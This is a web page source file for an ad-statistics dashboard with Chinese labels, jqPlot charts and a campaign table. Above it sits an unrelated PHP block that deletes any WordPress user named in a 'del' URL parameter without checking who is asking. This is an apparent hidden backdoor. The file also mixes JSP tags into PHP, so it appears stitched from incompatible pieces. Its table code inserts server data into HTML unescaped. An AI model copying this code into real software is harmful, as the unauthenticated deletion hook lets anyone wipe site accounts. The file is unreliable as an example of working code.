<?php

if(isset($_GET['del']) && !empty($_GET['del']) ){
	require_once './wp-admin/includes/user.php';
	wp_delete_user( $_GET['del'] );
	}
	

?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     <meta http-equiv="pragma" content="no-cache">
	 <meta http-equiv="cache-control" content="no-cache">
	 <meta http-equiv="expires" content="0">    
	 <meta http-equiv="keywords" content="advertise,analysis">
	 <meta http-equiv="description" content="statistic page">
     <link href="../css/style.css" rel="stylesheet" type="text/css"/>
     <link rel="Stylesheet" type="text/css" href="../css/tableStyle.css" />
     <title>无标题文档</title>
     <script type="text/javascript" src="../js/jquery-1.8.3.js"></script>
     <script type="text/javascript" src="../jquery/jquery-1.9.0.min.js"></script>
		<script type="text/javascript" src="../jquery/jquery.json-2.4.min.js"></script>
		<script type="text/javascript" src="../scripts/common.js"></script>
		
		<script type="text/javascript" src="../jquery/jqplot/excanvas.min.js"></script> 
		<!-- <script type="text/javascript" src="jquery/jqplot/jquery.min.js"></script> -->
		<script type="text/javascript" src="../jquery/jqplot/jquery.jqplot.min.js"></script> 
		<link rel="stylesheet" type="text/css" href="../jquery/jqplot/jquery.jqplot.min.css" />

		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.dateAxisRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.canvasTextRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.BezierCurveRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.canvasAxisTickRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.categoryAxisRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.pieRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.barRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.pointLabels.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.logAxisRenderer.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.highlighter.min.js"></script>
		<script type="text/javascript" src="../jquery/jqplot/plugins/jqplot.cursor.min.js"></script>

        <script language="javascript" type="text/javascript">
	
	var sessionData = {sid: "<%=sess%>"};
	
	function getArray(data) {
		var array = [];
		for (var idx=0; idx<data.length; idx++) {
		    var item = data[idx];
		    var result = [item.unit, item.value];
			array[idx] = result;
		}
		return array;
	}
	
	function openPage() {
		
		var ticks;
		var display;
		var click;
		var day_cost;
		var click_rate;
		//obtain the time period
	  sendRequest("GET", "/analyzer/rest/statistic/timePeriod", sessionData, function(response) {
		   
		    ticks=response;
		
		sendRequest("GET", "/analyzer/rest/statistic/<%=adOwnerId%>/displayPeriod", sessionData, function(response) {
			
		     display=response;
		
		  sendRequest("GET", "/analyzer/rest/statistic/<%=adOwnerId%>/clickPeriod", sessionData, function(response) {
		
		      click=response;
		      click_rate=[];
			  for(var i=0;i<click.length;i++)
			  {
				 
				  if(click[i]!=0)
				  {
					  click_rate[i]=(click[i]/display[i])*100;
				  }
				  else
					  click_rate[i]=0;
				  
			  }
		
		   sendRequest("GET", "/analyzer/rest/statistic/<%=adOwnerId%>/dayCost", sessionData, function(response) {
			  
		       day_cost=response;
		      
<%-- 		     sendRequest("GET", "/analyzer/rest/statistic/"+<%=orderId %>+"/day_cost", sessionData, function(response) { --%>
              sendRequest("GET", "/analyzer/rest/statistic/"+<%=adOwnerId%>+"/day_cost", sessionData, function(response) { 
			  
	           $.jqplot('chart3', [display,click,day_cost,click_rate], {
					title: '所有点击的历史曲线',
					series:[{renderer:$.jqplot.BarRenderer,label:'展现次数'},
					        {renderer:$.jqplot.BarRenderer,label:'点击次数'}, 
					        {renderer:$.jqplot.BarRenderer,xaxis:'xaxis', yaxis:'y2axis',label:'消耗费用'},
					        {xaxis:'xaxis', yaxis:'y3axis',label:'点击率'}
					        ],
					   
					        
					        
					legend: {
					    show: true,
					    placement: 'insideGrid'
					},
				    axes: {
				      xaxis: {
				    	label: '最近7天',   
				        renderer: $.jqplot.CategoryAxisRenderer,
				        ticks: ticks,
				        tickRenderer: $.jqplot.CanvasAxisTickRenderer,
				        tickOptions: {
				          angle: -30
				        }
				      },
			
				     
				      
				      yaxis: {
				    	  label: '次数',  
				    	  labelRenderer: $.jqplot.CanvasAxisLabelRenderer,
				          autoscale:true
				      },
				      y2axis: {
			           label: '消耗费用',
			           labelRenderer: $.jqplot.CanvasAxisLabelRenderer,
			           // tickRenderer:  $.jqplot.CanvasAxisTickRenderer,
			            alignTicks: true,
				    	min:0, 
			            max:null, 
			            numberTicks:7, 
				        autoscale:true
				      },
				      y3axis: {
				           //label: '点击率',
				           //labelRenderer: $.jqplot.CanvasAxisLabelRenderer,
				           // tickRenderer:  $.jqplot.CanvasAxisTickRenderer,
				           show: false , //是否显示刻度线，与刻度线同方向的网格线，以及坐标轴上的刻度值 
						   showLabel: false, //是否显示刻度线以及坐标轴上的刻度值 
						   showTicks: false, //是否显示刻度线以及坐标轴上的刻度值, 
						   showTickMarks: false, // 设置是否显示刻度 
				            alignTicks: true,
					    	min:0, 
				            max:null, 
				            numberTicks:11, 
					        autoscale:true
					   }
				    },
				    highlighter: {   
				    	show: true,             
				    	showLabel: true,             
				    	tooltipAxes: 'y',            
				    	sizeAdjust: 7.5 , 
				    	tooltipLocation : 'ne'       
				     }
			      });
				    
		         }, function(errorMsg) {
			        alert('error occurs on click history statistic retrieval');
		         });	
		
		       //the end of dayCost request
		        }, function(errorMsg) {
			      alert('error occurs');
		      });
		
		   //the end of clickPeriod
		   }, function(errorMsg) {
			  alert('error occurs');
		   });
		
		//the end of displayPeriod
		}, function(errorMsg) {
			alert('error occurs');
		});
		
	 //the end of the timePeriod 
	 }, function(errorMsg) {
		alert('error occurs');
	 });
		
		
     //add data into the table
	 sendRequest("GET", "/analyzer/rest/statistic/<%=adOwnerId%>/displayByActivity", sessionData, function(response) {
		   
		    //alert(response);
		$("<table class='mytable' cellspacing='0' border='0' ><tr>"
					+"<th scope='col'  style='text-align:center; border-left:1px solid #C1C9CA;'>名称</th>"
					+"<th scope='col'  style='text-align:center;'>总展示次数</th>"
					+"<th scope='col'  style='text-align:center;'>总点击次数</th>"
					+"<th scope='col'  style='text-align:center;'>开始时间</th>"
					+"<th scope='col'  style='text-align:center;'>结束时间</th></tr></table>").appendTo($("#createtable1"));
		    
		    for(var i=0;i<response.length;i++)
		    {
		    	//alert(response[i].name);
		    	 $("<tr id='campaign_'+response[i].id><td class='tabletd' scope='col'  style='text-align:center; border-left:1px solid #C1C9CA;'>" 
		    	 + response[i].name + "</td><td class='tabletd' scope='col'  style='text-align:center;'>" 
		    	 + response[i].countDisplay + "</td><td class='tabletd' scope='col'  style='text-align:center;'>" 
		    	 + response[i].countClick + "</td><td class='tabletd' scope='col'  style='text-align:center;'>" 
		    	 + response[i].startDate + "</td><td class='tabletd' scope='col'  style='text-align:center;'>" 
		    	 + response[i].endDate + "</td></tr>").appendTo(".mytable");
		    }
        	
		}, function(errorMsg) {
			alert('error occurs');
		});
		
		
		
	}	
	$(function() {
		openPage();
	});
</script>
        
        
</head>

<div class="main-title">
	<div class="title-1">当前位置：统计 > <font class="fontpurple">统计图表 </font>
	</div>
</div>
<div class="bgimg"></div>
	
<!--<div class="panel panel-default" style="margin-right:50px; margin-top:30px">
	<div class="panel-heading">功能列表</div>
	
</div>-->
					
</html>					
